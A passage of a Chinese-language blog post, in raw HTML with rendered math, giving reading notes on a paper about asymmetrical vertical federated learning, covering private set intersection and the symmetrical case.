mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> 为关于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">D</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{D}_1,\mathcal{D}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的<code>待对齐（pre-ID-alignment）数据集</code>，满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>∈</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub><mo>∈</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_1\in\mathcal{I}_1^o,\mathcal{I}_2\in\mathcal{I}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span>（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>i</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_i^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.942em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span>为对齐前的数据集对应的样本空间）。此外，我们使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">I^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span> 表示完整的ID空间，其包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">D</mi><mn>1</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{D}_1^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">D</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{D}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span> 中的所有可能的元素。</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717100303601.png" alt></p><h2 id="Private-Set-Intersection">Private Set Intersection</h2><p>在标准<code>隐私求交(PSI)</code>中，每一个参与方 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 拥有一个包含所有机密数据的数据集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。所有的参与方会协作求出交集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup><mo>=</mo><msub><mo>∩</mo><mi>i</mi></msub><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S^\prime=\cap_i{S_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mbin">∩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>，与此同时每一参与方 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 保持 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">S_i / S^\prime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span> 私有。PSI的实现方法可以基于：</p><ul><li>传统的公钥密码体系</li><li>不经意传输</li><li>混淆电路</li></ul><h2 id="Symmetrical-and-Asymmetrical">Symmetrical and Asymmetrical</h2><p>在上面的图1中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 就待对齐样本的元素数量上拥有同等的地位。事实上，即使<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>随机选择 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∈</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">e\in \mathcal{I}^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span>，也会有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mi mathvariant="normal">/</mi><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow><mo>≫</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\left|\mathcal{I}_{2}^{o}\right| /\left|\mathcal{I}^{w}\right| \gg 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≫</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的概率选到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∈</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">e\in \mathcal{I}^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span>。在这种&quot;<code>强联邦（federation of the strong）</code>&quot;中，每一方都不会在执行PSI协议求交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的过程中掌握很多的信息，因此也不会让对方知道自己很多的ID信息，本文称这种方案为<code>对称纵向联邦学习（Symmetrical Vertical Federated Learning，SVFL）</code>。</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717115752191.png" alt></p><p>与SVFL相反的情况是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span 